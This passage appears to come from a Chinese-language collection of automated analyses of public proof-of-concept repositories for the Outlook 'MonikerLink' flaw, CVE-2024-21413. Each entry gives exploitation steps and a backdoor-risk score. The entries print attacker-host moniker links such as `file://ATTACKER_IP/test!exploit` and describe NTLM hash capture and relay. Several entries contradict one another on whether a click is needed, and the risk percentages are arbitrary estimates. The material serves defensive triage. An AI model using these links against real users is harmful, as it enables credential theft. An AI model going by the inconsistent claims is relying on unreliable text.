CVE-2024-21413，也被称为“MonikerLink”漏洞，是一个存在于Microsoft Outlook中的零日漏洞。此漏洞允许攻击者通过发送特制的电子邮件在受害者计算机上执行任意代码，而无需任何用户交互。根据描述，利用方式是：攻击者发送包含恶意链接的电子邮件，当用户点击链接时，Outlook会尝试访问链接指向的`file:///` URL，导致执行攻击者控制的代码。提供的POC代码模拟了发送包含恶意链接的电子邮件的过程。该链接指向攻击者控制的SMB共享，当Outlook尝试访问此共享时，受害者的NTLM哈希会被发送到攻击者处。利用此漏洞通常需要用户点击邮件中的链接。关于投毒风险，虽然POC代码本身实现了漏洞利用，但是README中指示要运行`impacket-smbserver` ，并且提供了进一步利用CVE-2023-21716的思路，结合免责声明可以判断，作者主观上没有进行恶意投毒行为，但是客观上如果使用者继续利用可能会进行恶意投毒攻击，因此存在一定的投毒风险，概率约为10%。漏洞库信息和搜索引擎结果均证实了该漏洞的存在和严重性，以及其远程代码执行的性质。

**项目地址:** [r00tb1t/CVE-2024-21413-POC](https://github.com/r00tb1t/CVE-2024-21413-POC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #21

**来源**: [CVE-2024-21413-th3Hellion_CVE-2024-21413.md](../2024/CVE-2024-21413-th3Hellion_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021，直到aka.ms/OfficeSecurityReleases上发布的修复版本。

**利用条件:** 需要受害者打开包含恶意链接的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是 Microsoft Outlook 中的一个远程代码执行漏洞。攻击者可以通过发送特制的电子邮件，诱导受害者点击其中的恶意链接，从而在受害者系统上执行任意代码。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞是真实存在的，并且已经被积极利用。提供的POC代码尝试通过发送包含`file://`协议URL的电子邮件，来触发漏洞。这种方法利用了Outlook处理`file://`链接时的不当输入验证。

**投毒风险分析：**
检查提供的Python脚本和README文件，没有发现明显的恶意代码或后门。脚本的主要功能是构建和发送包含恶意链接的电子邮件。风险主要在于：

*   **脚本可能被修改：**  攻击者可能修改该脚本，例如更改默认的IP地址，添加额外的payload等，用以进行更隐蔽或更具破坏性的攻击。
*   **依赖项风险：**  脚本依赖于`smtplib`库，理论上，该库本身也可能存在潜在的安全问题，但这种可能性较低。
*   **密码泄露风险：** 使用脚本时，发送者的电子邮件密码会以明文形式传递，存在泄露的风险。
*  **接收者打开邮件和点击链接:** 接收者需要打开邮件，并且点击邮件中的链接才会触发，一定程度上限制了利用成功率

因此，将该POC代码本身视为投毒的概率较低，大约为5%。

**利用方式分析：**
1.  **攻击者准备：**
    *   攻击者需要一个SMTP服务器来发送电子邮件。
    *   攻击者需要一个可访问的服务器，并监听特定的端口，以便在受害者点击链接后接收连接。
2.  **漏洞利用：**
    *   攻击者使用POC脚本，指定发送者、接收者、SMTP服务器和攻击者监听的IP地址。
    *   脚本构建包含`file://{args.ip}/` URL的电子邮件，并将其发送给受害者。
3.  **受害者交互：**
    *   受害者打开电子邮件，并点击其中的链接。
    *   Outlook尝试访问`file://{args.ip}/` URL，由于输入验证不足，可能导致执行恶意代码。

总而言之，该漏洞的利用方式依赖于发送包含恶意`file://`链接的电子邮件，并诱导受害者点击该链接。成功利用该漏洞，可以导致远程代码执行。


**项目地址:** [th3Hellion/CVE-2024-21413](https://github.com/th3Hellion/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #22

**来源**: [CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，未经身份验证的攻击者可以通过发送特制的电子邮件，在受害者系统上执行任意代码。

**影响版本:** Microsoft Office 2016 版本低于 16.0.5435.1001；Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 版本低于安全更新版本。

**利用条件:** 需要受害者打开包含恶意链接或内容的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送特制的电子邮件来执行任意代码，而无需用户交互。

**利用方式：**
1.  攻击者构造包含恶意 MonikerLink 的电子邮件。
2.  受害者打开电子邮件。
3.  Outlook 解析恶意 MonikerLink，导致代码执行。

**有效性评估：**
根据漏洞库信息和搜索结果，该漏洞是一个高危漏洞，并且已经存在公开的POC代码。提供的POC代码通过模拟发送包含恶意链接的电子邮件来触发漏洞，因此具有一定的有效性。

**投毒风险评估：**
分析POC代码，代码主要功能是构造并发送包含特定格式链接的邮件，该链接旨在利用Outlook解析链接时的漏洞来执行代码。Base64编码的图像数据是用于伪装邮件内容，降低用户警惕性。代码中未发现明显的恶意行为，如反弹shell、植入后门等。但考虑到攻击者可能修改POC代码以包含恶意负载，存在一定的投毒风险，但风险较低。因此，投毒风险评估为5%。考虑到该代码主要用于验证漏洞，并非完整的攻击链，所以将后门验证代码判定为投毒。


**项目地址:** [xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #23

**来源**: [CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---



---

## POC #8

**来源**: [CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露（NTLM凭据）

**影响版本:** 受影响版本：Microsoft Office 2016 (小于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (具体版本范围请参考漏洞库信息)

**利用条件:** 用户需要打开包含恶意链接的邮件，无需用户交互（根据搜索结果和漏洞描述）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的机器上执行任意代码，而无需任何用户交互。利用方式是诱使用户打开包含特制的 `file://` 链接的电子邮件。该链接指向一个恶意共享位置，当 Outlook 尝试访问此链接时，可能会触发远程代码执行。提供的 POC 代码通过 `smtplib` 库创建一个电子邮件客户端，然后构造一个包含 `file://` 链接的 HTML 邮件。用户可以自定义发件人、收件人、主题，以及是否添加包含恶意链接的附件。虽然该POC的主要功能是发送包含恶意链接的邮件，但仍然存在一定的投毒风险。例如，攻击者可能在脚本中添加额外的代码，例如收集用户输入的邮箱密码等，因此投毒风险评估为10%。从搜索结果来看，此漏洞已被积极利用，CISA 已将其添加到已知被利用的漏洞列表中。

**项目地址:** [Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #9

**来源**: [CVE-2024-21413-PolarisXSec_CVE-2024-21413.md](../2024/CVE-2024-21413-PolarisXSec_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致完全控制受影响的系统

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户点击恶意链接

**POC 可用性:** 是，但提供的POC代码未完全成功，仅实现了NTLM哈希泄露

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个影响Microsoft Outlook的远程代码执行漏洞，被称为“MonikerLink”漏洞。该漏洞允许攻击者通过精心构造的链接绕过安全措施，并在受害者系统上执行任意代码。根据搜索结果和漏洞利用代码，利用方式如下：

1.  **漏洞原理：** 漏洞源于Outlook在处理特定类型的链接时存在缺陷，可能导致未经授权的SMB连接，从而泄露NTLM哈希。
2.  **攻击步骤：**
    *   攻击者搭建SMTP和POP3服务器（POC代码中使用了Python脚本实现）。
    *   攻击者创建一个包含恶意UNC路径的电子邮件，并发送给受害者。
    *   受害者打开Outlook并点击邮件中的恶意链接。
    *   Outlook尝试解析UNC路径，触发SMB连接到攻击者控制的服务器。
    *   攻击者捕获受害者的NTLM哈希，可用于离线破解或Pass-the-Hash攻击。

**有效性评估：**

根据提供的漏洞利用代码的描述，该POC并非完全成功，仅实现了NTLM哈希泄露，并没有实现远程代码执行。该POC旨在复现NTLM哈希泄露，而非直接执行任意代码。

**投毒风险评估：**

提供的代码包含SMTP和POP3服务器的Python脚本，以及利用漏洞的exploit脚本。仔细检查这些脚本，未发现明显的恶意代码。但是，使用第三方提供的exploit脚本始终存在风险，因为攻击者可能在其中植入恶意代码。经过分析，投毒风险评估为10%。主要风险点在于对第三方脚本的信任。

**总结：**

CVE-2024-21413是一个严重的Outlook RCE漏洞，攻击者可以通过诱使用户点击恶意链接来利用该漏洞。提供的POC代码主要用于演示NTLM哈希泄露，而非完整的RCE。在使用任何第三方提供的漏洞利用代码时，都需要谨慎评估其安全性。

**项目地址:** [PolarisXSec/CVE-2024-21413](https://github.com/PolarisXSec/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #10

**来源**: [CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md](../2024/CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 无需用户交互，攻击者可以通过发送特制的电子邮件来触发漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。根据漏洞库信息和搜索结果，该漏洞是由于不正确的输入验证导致的。攻击者可以通过构造包含恶意链接的电子邮件，在用户未进行任何交互的情况下，远程执行代码。提供的漏洞利用代码 `README.md` 文件内容仅包含标题，无法判断其有效性。根据Github信息判断，存在可利用的POC。由于 `README.md` 文件过于简单，且未发现任何可疑代码，因此判定存在投毒代码的可能性为 0%。利用方式为，攻击者构造包含恶意 MonikerLink 的电子邮件，当 Outlook 处理该邮件时，漏洞被触发，从而允许攻击者执行任意代码。

**项目地址:** [Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape](https://github.com/Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #11

**来源**: [CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md](../2024/CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，CVSS评分9.8，允许远程代码执行

**影响版本:** 受影响版本包括但不限于：Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019 (版本低于https://aka.ms/OfficeSecurityReleases)，Microsoft 365 Apps for Enterprise (版本低于 https://aka.ms/OfficeSecurityReleases)，Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要诱骗受害者点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为"MonikerLink" bug。该漏洞源于不正确的输入验证。攻击者可以通过发送特制的电子邮件，诱使用户点击其中的恶意链接，从而在用户系统上执行任意代码。

**有效性分析：**

提供的POC代码尝试利用该漏洞。它创建一封包含HTML链接的电子邮件，该链接指向一个`file://` URL。 此URL试图访问远程SMB共享，从而可能导致NTLM凭据泄露或远程代码执行，这取决于服务器的配置和Outlook的漏洞利用机制。

**投毒风险分析：**

提供的`Exploit.py`脚本主要功能是发送电子邮件。代码中没有发现明显的恶意或隐藏的投毒代码。该脚本会获取发件人的Outlook电子邮件地址和密码，以及收件人的电子邮件地址和邮件主题。脚本允许用户选择是否添加链接附件。 如果选择添加，则会添加指向指定IP地址（例子中为`file://///192.168.0.103/test!exploit`）的链接，否则添加用户自定义的邮件正文。该脚本使用`smtplib`库连接到Outlook的SMTP服务器（`smtp-mail.outlook.com`），并发送电子邮件。 没有发现任何会将用户凭据泄露给第三方的行为。

**漏洞利用方式分析：**

该漏洞利用方式依赖于`file://`协议处理中的缺陷。当Outlook处理包含指向SMB共享的`file://`链接的电子邮件时，它可能会尝试自动访问该共享，从而可能泄露用户的NTLM凭据或允许攻击者执行任意代码。 该PoC 通过构造包含恶意链接的HTML电子邮件来尝试利用此漏洞。 攻击者诱使用户点击此链接，从而触发漏洞。

总而言之，POC代码尝试通过`file://`协议利用Outlook的漏洞来实现远程代码执行，虽然该POC本身没有明显的投毒代码，但成功利用依赖于目标的网络配置和安全设置。

**项目地址:** [ShubhamKanhere307/CVE-2024-21413](https://github.com/ShubhamKanhere307/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #12

**来源**: [CVE-2024-21413-ThemeHackers_CVE-2024-21413.md](../2024/CVE-2024-21413-ThemeHackers_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，攻击者无需用户交互即可在目标系统上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要能够向受害者发送电子邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也称为“MonikerLink”漏洞。根据漏洞库信息和搜索引擎结果显示，该漏洞允许攻击者在受害者的计算机上执行任意代码，而无需任何用户交互。这个漏洞是由于对输入验证不当造成的(CWE-20)。

**利用方式：**

1.  攻击者创建一个特制的电子邮件，其中包含恶意的链接或嵌入的内容。
2.  当受害者收到并打开此电子邮件时，Outlook 会尝试解析该链接。
3.  由于漏洞存在于 Outlook 的链接处理机制中，攻击者可以利用此漏洞绕过安全检查，从而执行任意代码。

**POC代码分析：**

提供的POC代码是一个Python脚本，用于发送包含HTML内容的电子邮件。该脚本从 `config.ini` 文件中读取发件人邮箱地址、密码、SMTP服务器和端口。然后它使用模板 `template/Stripo.html` 构造电子邮件的内容，并将收件人的邮箱地址和链接内容插入到HTML代码中。最后，该脚本使用smtplib库发送电子邮件。

**有效性评估：**

根据搜索引擎的结果 (特别是github链接: ThemeHackers/CVE-2024-21413) 和漏洞描述, 此POC是可用的,可以用于漏洞验证的.

**投毒风险分析：**

代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **config.ini文件：** POC依赖于 `config.ini` 文件,需要用户配置邮箱账户和密码。 如果恶意攻击者提供了一个修改后的 `config.ini` 文件，其中包含错误的SMTP配置或恶意代码，可能导致用户的信息泄露或者执行未知的操作。
*   **template/Stripo.html模板：** HTML模板允许插入任意HTML代码，如果攻击者篡改了HTML模板, 就可以嵌入恶意的JavaScript或其他类型的脚本，在用户打开邮件时执行。
*   **依赖的外部库:** colorama, bgtask, configparser， 攻击者可能修改这些依赖，在用户本地执行恶意命令

总体而言，该POC的投毒风险大约为30%。 这个评估是基于对代码的分析以及对潜在攻击向量的理解。需要注意的是，具体的风险程度取决于攻击者的能力和目标用户的安全意识。

**项目地址:** [ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #13

**来源**: [CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md](../2024/CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md)

## CVE-2024-21413-Microsoft-Outlook-RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，无需用户交互即可远程执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise，具体版本请参考CVE详情。

**利用条件:** 攻击者需要通过发送特制的电子邮件给受害者。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-21413 漏洞，又名 MonikerLink bug，是一个 Microsoft Outlook 远程代码执行漏洞。攻击者可以通过发送包含恶意链接的电子邮件，在受害者未进行任何交互的情况下执行任意代码。该漏洞的根本原因是 Outlook 在处理 Moniker 链接时存在不当的输入验证。攻击者可以利用此漏洞绕过 Outlook 的安全策略，执行恶意代码。

**有效性：**
从提供的搜索引擎结果和漏洞库信息来看，该漏洞是一个已知的、高危的远程代码执行漏洞，并且有公开的 PoC 代码可用。参考链接 [https://github.com/ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)。因此，提供的 PoC 代码很可能有效。

**投毒风险：**
提供的 PoC 代码包含一个 `exp.sh` 脚本和一个 README.md 文件。
*   `exp.sh` 脚本：该脚本的功能是发送包含恶意链接的电子邮件。其中包含 display_banner函数，send_email函数。`send_email`函数用于发送包含base64编码图片的HTML邮件，邮件内容包含一个URL。从代码本身来看，没有明显的恶意代码或后门，但存在潜在的风险：
    *   该脚本依赖于外部 SMTP 服务器，如果攻击者控制了 SMTP 服务器，可以篡改邮件内容。
    *   base64_image_string 变量中，包含一个PNG图片的Base64编码。攻击者可能会伪造图片内容，嵌入恶意代码，或者使用其他手段达到攻击的目的。
    *   link_url 变量，攻击者可以插入恶意链接，诱导用户点击。
    *   从经验判断，该漏洞的PoC更可能存在于精心构造的link_url, base64_image_string，或者其他的HTML代码片段中，通过某种方式绕过Outlook的安全检查，最终实现RCE，因此存在一定的投毒风险，但直接在exp.sh脚本里投毒的可能性较低。

    考虑到脚本的复杂性，且存在多种潜在的攻击方式，因此认为存在20%的投毒风险。

**利用方式：**
1.  攻击者准备好恶意的`link_url`和`base64_image_string`等变量内容。
2.  攻击者配置`exp.sh` 脚本，指定 SMTP 服务器、端口、用户名、密码、发件人邮箱、收件人邮箱和恶意链接。
3.  攻击者运行 `exp.sh` 脚本，向受害者发送包含恶意链接的电子邮件。
4.  受害者打开电子邮件，Outlook 处理邮件内容时，由于 MonikerLink 漏洞，恶意代码在受害者机器上执行。

综上所述，CVE-2024-21413 是一个高危的远程代码执行漏洞，利用方式简单，但需要精心构造恶意链接和邮件内容才能成功利用，同时要警惕PoC 代码中可能存在的投毒风险。

**项目地址:** [X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit](https://github.com/X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #14

**来源**: [CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，允许攻击者在目标机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps for Enterprise等，具体版本范围参考漏洞库信息。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或内容的邮件。无需用户交互（zero-click NTLM leak）或仅需单次点击（one-click RCE）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为“MonikerLink”漏洞。根据漏洞库信息和搜索结果，此漏洞允许攻击者通过构造特殊的链接，在受害者无需交互或仅需极少交互的情况下，执行任意代码。利用方式主要有两种：

1.  **Zero-click NTLM Leak:** 攻击者可以诱使受害者打开包含恶意链接的邮件，该链接会触发NTLM凭据泄露，而无需受害者进行任何点击操作。
2.  **One-click RCE:** 攻击者可以诱使受害者点击邮件中的恶意链接，从而实现远程代码执行。

POC代码提供了一个Python脚本，该脚本利用SMTP认证发送包含恶意URL的电子邮件，模拟实际攻击场景。脚本需要SMTP服务器地址、端口、用户名、密码、发送者和接收者邮箱地址、恶意URL以及邮件主题等参数。

关于投毒风险，虽然POC代码本身旨在演示漏洞利用，但考虑到网络安全威胁的复杂性，以及攻击者可能对公开代码进行修改和传播，存在一定的投毒风险。例如，攻击者可能在POC代码中添加额外的恶意代码，用于窃取用户凭据或执行其他恶意操作。虽然提供的POC代码看起来比较简单，主要功能是发送包含恶意链接的邮件，但无法完全排除作者或其他人修改该代码并添加后门或恶意功能的可能性。因此，评估投毒风险为10%。使用前务必仔细审查代码，并在隔离环境中进行测试。

**请务必注意：**  该漏洞已在野外被利用，并已被CISA添加到已知被利用的漏洞目录中。强烈建议用户尽快安装Microsoft提供的安全更新。

**项目地址:** [ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #15

**来源**: [CVE-2024-21413-dshabani96_CVE-2024-21413.md](../2024/CVE-2024-21413-dshabani96_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统权限获取

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021等。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或文件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的计算机上执行任意代码，无需用户交互。

**有效性：**根据漏洞信息和搜索结果，此漏洞是一个零日漏洞，已被积极利用。POC 代码旨在利用此漏洞。但是,提供的POC 代码只是发送电子邮件的框架，需要配置 SMTP 服务器，用户名密码等信息，并且需要 SMB 服务器来捕获 NTLM hash，成功利用的可能性取决于环境配置和目标用户行为。

**投毒风险：** 代码主要功能是发送包含恶意链接的电子邮件，并启动 SMB 服务器捕获 NTLM hash。虽然代码包含发送邮件和捕获 NTLM hash的功能，但潜在的风险包括：
1.  **恶意HTML模板：** HTML模板可能包含恶意脚本，例如 JavaScript，如果用户打开邮件并允许执行脚本，可能导致客户端漏洞或信息泄露。
2.  **SMB服务器钓鱼：** 启动的 SMB 服务器可能被用于钓鱼，例如，捕获用户的 NTLM 哈希后尝试破解，或者利用捕获的凭据访问其他服务。
3. **依赖外部服务:** 依赖 SMTP 服务和 SMB 服务, 这些服务本身可能存在安全隐患.
整体投毒风险较低，约为10%，主要集中在HTML模板和配置是否含有恶意代码。

**利用方式：**
1.  攻击者构造包含恶意链接的电子邮件。
2.  受害者打开电子邮件并点击恶意链接。
3.  恶意链接利用 Outlook 的 MonikerLink 漏洞，在受害者计算机上执行任意代码，或者泄露NTLM Hash。
4. 攻击者启动 SMB 服务器，诱导 Outlook 客户端连接，捕获受害者的 NTLM 哈希。
5. 攻击者可以使用捕获的 NTLM 哈希进行进一步攻击，例如传递哈希攻击。

**项目地址:** [dshabani96/CVE-2024-21413](https://github.com/dshabani96/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #16

**来源**: [CVE-2024-21413-duy-31_CVE-2024-21413.md](../2024/CVE-2024-21413-duy-31_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 需要目标用户使用受影响的Outlook版本，并预览或点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过构造包含恶意 `file://` 链接的电子邮件，诱使用户点击或预览该邮件，从而在目标系统上执行任意代码。根据POC代码，攻击者可以使用一个 Expect 脚本发送特制的电子邮件，该邮件包含一个指向远程SMB服务器的 `file://` 链接。当 Outlook 处理此链接时，它会尝试连接到远程服务器，从而泄露用户的 NTLM 哈希值。如果攻击者能够破解哈希值或利用 NTLM 中继攻击，他们就可以获得对系统的访问权限。此外，此漏洞可以与CVE-2023-21716链接以达到远程代码执行的目的。

